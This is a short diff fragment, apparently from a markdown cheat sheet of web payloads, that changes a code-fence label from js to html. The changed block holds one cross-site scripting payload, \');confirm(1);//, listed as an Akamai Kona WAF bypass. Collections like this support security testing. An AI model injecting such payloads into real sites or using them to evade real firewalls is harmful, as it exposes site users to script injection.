@@ -9,7 +9,7 @@
 ```
 **Kona WAF (Akamai) Bypass**
 
-```js
+```html
 \');confirm(1);//
 ```
 
